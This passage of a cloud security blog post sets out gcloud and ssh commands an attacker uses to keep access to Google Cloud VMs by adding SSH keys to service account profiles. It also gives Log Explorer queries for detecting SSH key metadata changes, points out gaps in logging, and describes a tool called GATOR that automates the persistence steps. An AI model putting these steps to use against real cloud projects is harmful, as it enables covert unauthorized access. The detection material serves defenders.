<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud auth <span style="color:#007020">activate-service</span>-account --key<span style="color:#666">-file</span>=/path/to/<span style="color:#007020">service-account</span>-key.json
</span></span></code></pre></div></li>
<li>
<p>Generate SSH Public and Private Key pair for Google Cloud Service Account:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#007020">ssh-keygen</span> -t rsa -b <span style="color:#40a070">4096</span> -C <span style="color:#4070a0">&#34;service-account-name@project-id.iam.gserviceaccount.com&#34;</span>
</span></span></code></pre></div><p>This will generate a Private Key <code>(~/.ssh/id_rsa)</code> and a Public Key <code>(~/.ssh/id_rsa.pub)</code>.</p>
</li>
<li>
<p>Attacker associates the Public Key with a Google Cloud Service Account:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> add --key<span style="color:#666">-file</span> ~/.ssh/id_rsa.pub
</span></span></code></pre></div></li>
<li>
<p>To make sure the SSH Keys were associated with the Service Account and note the POSIX username:</p>
<pre tabindex="0"><code>powershell
gcloud compute os-login describe-profile
gcloud compute os-login ssh-keys list
</code></pre></li>
<li>
<p>Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance without needing to authenticate to GCP or have access to a valid User / Service Account.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssh -i ~/.ssh/id_rsa [<span style="color:#60add5">POSIX_USERNAME</span>]@[<span style="color:#60add5">EXTERNAL_IP</span>]
</span></span></code></pre></div></li>
<li>
<p>Attacker can revoke the associated Public Key from the Google Cloud Service Account if they want:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> list    
</span></span><span style="display:flex;"><span>gcloud compute <span style="color:#007020">os-login</span> <span style="color:#007020">ssh-keys</span> remove --key [<span style="color:#60add5">FINGERPRINT</span>]
</span></span></code></pre></div></li>
</ol>
<blockquote>
<p>[!NOTE]</p>
<ul>
<li>Key association with a Service Account is logged in the platform&rsquo;s audit trails.</li>
<li>The key is associated with a specific service account, making it traceable to that identity.</li>
<li>If the service account is deleted or its permissions are modified, the attacker might lose access.</li>
<li>Service accounts are not meant for direct human access. Associating SSH keys with service accounts is a deviation from best practices and could raise red flags if detected.</li>
</ul>
</blockquote>
<h1 id="detection">Detection</h1>
<h2 id="persisting-in-compute-engine-vms-default--block-project-wide-ssh-keys-1">Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</h2>
<h3 id="detecting-addition--modification-in-project-level-metadata">Detecting addition / modification in Project-level Metadata</h3>
<p>The query below is designed to detect changes to SSH keys at the Project-level. It specifically looks for events triggered by the <code>compute.projects.setCommonInstanceMetadata</code> API method. Within this method, the query inspects the <code>addedMetadataKeys</code> and <code>modifiedMetadataKeys</code> fields to check for the term &ldquo;ssh-keys&rdquo;. If either of these conditions is met, the event will be flagged. This could indicate that SSH keys have been added or modified at the Project-level, which may signify a configuration change or potentially suspicious activity.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#666">(</span>
</span></span><span style="display:flex;"><span>  protoPayload.methodName:<span style="color:#4070a0">&#34;compute.projects.setCommonInstanceMetadata&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">)</span>
</span></span><span style="display:flex;"><span>AND
</span></span><span style="display:flex;"><span><span style="color:#666">(</span>
</span></span><span style="display:flex;"><span>  protoPayload.metadata.projectMetadataDelta.addedMetadataKeys:<span style="color:#4070a0">&#34;ssh-keys&#34;</span>
</span></span><span style="display:flex;"><span>  OR
</span></span><span style="display:flex;"><span>  protoPayload.metadata.projectMetadataDelta.modifiedMetadataKeys:<span style="color:#4070a0">&#34;ssh-keys&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">)</span>
</span></span></code></pre></div><h3 id="detecting-addition--modification-in-instance-level-metadata">Detecting addition / modification in Instance-level Metadata</h3>
<p>The query below is designed to detect changes to SSH keys at the Instance-level. It focuses on the <code>compute.instances.setMetadata</code> API method. Similar to the first query, it examines the <code>addedMetadataKeys</code> field for the presence of &ldquo;ssh-keys&rdquo;. If this condition is met, the event will be flagged, indicating that SSH keys have been added at the Instance-level. This could be a sign of a configuration change or an action that requires further investigation for security reasons.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#666">(</span>
</span></span><span style="display:flex;"><span>  protoPayload.methodName:<span style="color:#4070a0">&#34;compute.instances.setMetadata&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">)</span>
</span></span><span style="display:flex;"><span>AND
</span></span><span style="display:flex;"><span><span style="color:#666">(</span>
</span></span><span style="display:flex;"><span>  protoPayload.metadata.instanceMetadataDelta.addedMetadataKeys:<span style="color:#4070a0">&#34;ssh-keys&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">)</span>
</span></span></code></pre></div><h3 id="detecting-addition--modification-in-both-project-level-and-instance-level-metadata">Detecting addition / modification in both Project-level and Instance-level Metadata</h3>
<p>Below is a GCP Query one can run in Log Explorer to detect any changes either addition or modification in both Project-level and Instance-level metadata.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#666">(</span>
</span></span><span style="display:flex;"><span>  protoPayload.methodName:<span style="color:#4070a0">&#34;compute.projects.setCommonInstanceMetadata&#34;</span>
</span></span><span style="display:flex;"><span>  OR
</span></span><span style="display:flex;"><span>  protoPayload.methodName:<span style="color:#4070a0">&#34;compute.instances.setMetadata&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">)</span>
</span></span><span style="display:flex;"><span>AND
</span></span><span style="display:flex;"><span><span style="color:#666">(</span>
</span></span><span style="display:flex;"><span>  protoPayload.metadata.instanceMetadataDelta.addedMetadataKeys:<span style="color:#4070a0">&#34;ssh-keys&#34;</span>
</span></span><span style="display:flex;"><span>  OR
</span></span><span style="display:flex;"><span>  protoPayload.metadata.projectMetadataDelta.addedMetadataKeys:<span style="color:#4070a0">&#34;ssh-keys&#34;</span>
</span></span><span style="display:flex;"><span>  OR
</span></span><span style="display:flex;"><span>  protoPayload.metadata.projectMetadataDelta.modifiedMetadataKeys:<span style="color:#4070a0">&#34;ssh-keys&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#666">)</span>
</span></span></code></pre></div><p>The query focuses on two main API methods: <code>compute.projects.setCommonInstanceMetadata</code> for Project-level Metadata changes and <code>compute.instances.setMetadata</code> for Instance-level Metadata changes. Within these methods, the query examines the <code>addedMetadataKeys</code> and <code>modifiedMetadataKeys</code> fields for the presence of &ldquo;ssh-keys&rdquo;. If any of these conditions are met, the query will flag the event, indicating that SSH keys were either added or modified, which could be a sign of a configuration change or potentially unauthorized activity.</p>
<p>After filtering for changes to SSH keys at either the Project-level or Instance-level using the provided queries, you can further refine your investigation by identifying the responsible entity. To do this, you can look at the <code>protoPayload.authenticationInfo.serviceAccountDelegationInfo.firstPartyPrincipal.principalEmail</code> (if it exists) and <code>protoPayload.authenticationInfo.principalEmail</code> fields in the log data.</p>
<p>The <code>protoPayload.authenticationInfo.principalEmail</code> field will show you the email of the Principal (either a user or a service account) that initiated the API call to add or modify the Project / Instance Metadata. This is useful for directly identifying who made the changes.</p>
<p>If impersonation or delegation is involved, the <code>protoPayload.authenticationInfo.serviceAccountDelegationInfo.firstPartyPrincipal.principalEmail</code> field will reveal the email of the first-party principal that has been delegated permissions. This can help you understand if a service account was used to impersonate another entity to make these changes.</p>
<p>By examining these fields, you can gain insights into who made the changes or if a service account was impersonated, which is crucial for security audits and investigations.</p>
<h2 id="persisting-via-direct-ssh-key-addition-in-the-authorized_keys-file">Persisting via Direct SSH Key addition in the &ldquo;authorized_keys&rdquo; file</h2>
<p>GCP doesn&rsquo;t log system-level changes or modifications like adding a Public SSH Key to the <code>~/.ssh/authorized_keys</code> file. However, this gap can be mitigated by using third-party logging agents that can capture system-level changes.</p>
<h2 id="persisting-in-compute-engine-vms-os-login-1">Persisting in Compute Engine VMs: OS Login</h2>
<p>One way to detect any Persistence in case of OS Login is to check the part where the Persistance vector is being added, in this case it&rsquo;s the Cloud User / Service Account profile. While GCP does log instances of users logging into a Instances when OS Login is enabled, it does not log the addition of SSH Public Keys to a Cloud User or Service Account profile.</p>
<p>This lack of logging creates a blind spot for defenders, making it difficult to track who has added an SSH key and potentially leaving the door open for unauthorized access. For attackers, this is a significant advantage, as they can add their SSH keys without triggering any alerts or logs, thereby gaining a stealthy pathway into the system. This is a considerable chokepoint for defenders and something that organizations should be aware of when configuring their GCP security settings.</p>
<h1 id="gator---how-can-it-help">GATOR - How can it help?</h1>
<p>GATOR can help by automating various steps discussed above. It can detect whether OS Login is Enabled or Disabled at either Instance or Project Level and Project-wide SSH Key is Enabled or Disabled at Instance Level and can take the steps accordingly.</p>
<h3 id="os-login---associating-the-public-key-with-google-cloud-user-account">OS Login - Associating the Public Key with Google Cloud User Account</h3>
<p>If OS Login is enabled, GATOR can exploit this feature to add SSH public keys directly to User Account profile depending on the user authenticated as.</p>
<p><img src="https://drive.google.com/uc?id=1ewi92Qv1ms_jHfttbozCSho2fpyAC5br" alt="4"></p>
<h3 id="os-login---associates-the-public-key-with-google-cloud-service-account">OS Login - Associates the Public Key with Google Cloud Service Account</h3>
<p>If OS Login is enabled, GATOR can exploit this feature to add SSH public keys directly to Service Account profiles as well depending on the user authenticated as.</p>
<p><img src="https://drive.google.com/uc?id=1TYjlF6s5tf5VGONkmfDe5Cb2c79SpC3V" alt="5"></p>
<h3 id="block-project-wide-ssh-keys-enabled">Block Project-wide SSH Keys Enabled</h3>
<p>GATOR can identify if Project-wide SSH keys are enabled. In such cases, it can conveniently add public keys at the Instance level.</p>
<p><img src="https://drive.google.com/uc?id=1_QbVB_fCAzd3Hr710fGSZYd2-NTXetg_" alt="6"></p>
<h3 id="block-project-wide-ssh-keys-disabled">Block Project-wide SSH Keys Disabled</h3>
<p>GATOR can identify if Project-wide SSH keys are disabled. In such cases, it can conveniently add public keys at both Project and Instance level.</p>
<p><img src="https://drive.google.com/uc?id=1DJQXK9CZ7bQtLZCXprjPHrb6hpEDZMYT" alt="7"></p>

      </div>
    </div>
  </div>
  <div class="pure-u-1-24 pure-u-md-5-24"></div>
</div>

<div class="footer pure-g">
  <div class="pure-u-1-24 pure-u-md-5-24"></div>
  <div class="pure-u-11-12 pure-u-md-7-12">
    <div class="footer-content">
      <div class="pure-menu pure-menu-horizontal">
        <ul>
          
          <li class="pure-menu-item" id="foot-name">© Aos Dabbagh</li>
          

          
          <li class="pure-menu-item">
            <a href="mailto:your@email.com" class="pure-menu-link">Email</a>
          </li>
          

          
          <li class="pure-menu-item">
            <a href="https://github.com/aos" class="pure-menu-link">GitHub</a>
          </li>
          

          
          <li class="pure-menu-item">
            <a href="https://twitter.com/twitterID" class="pure-menu-link">Twitter</a>
          </li>
          

          
          <li class="pure-menu-item">
            <a href="https://medium.com/@mediumUsername" class="pure-menu-link">Medium</a>
          </li>
          

        </ul>
        <a href="#" class="pure-menu-link pull-right" id="gototop-btn">↑↑</a>
        
      </div>
      
      <p id="foot-copyright">(c) 2008 - 2014</p>
      
    </div>
  </div>
  <div class="pure-u-1-24 pure-u-md-5-24"></div>
</div>

<script type="text/javascript">
  go();
  window.addEventListener('resize', go);
  function go(){
    var d=document.querySelector(".desktop")
    if(document.documentElement.clientWidth > 768) {
      d.style.display="";
    } else {
      d.style.display="none";
    }
  }
</script>
<script type="text/javascript">
  var a=document.querySelector("#toggle-btn"),b=document.querySelector("#toggle-content");a.addEventListener("click",function(){""==b.style.display?(b.style.display="none",a.innerHTML="☰"):(b.style.display="",a.innerHTML="X")});</script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'Your Google Analytics ID', 'auto');
  ga('send', 'pageview');
</script>

</body>
</html>

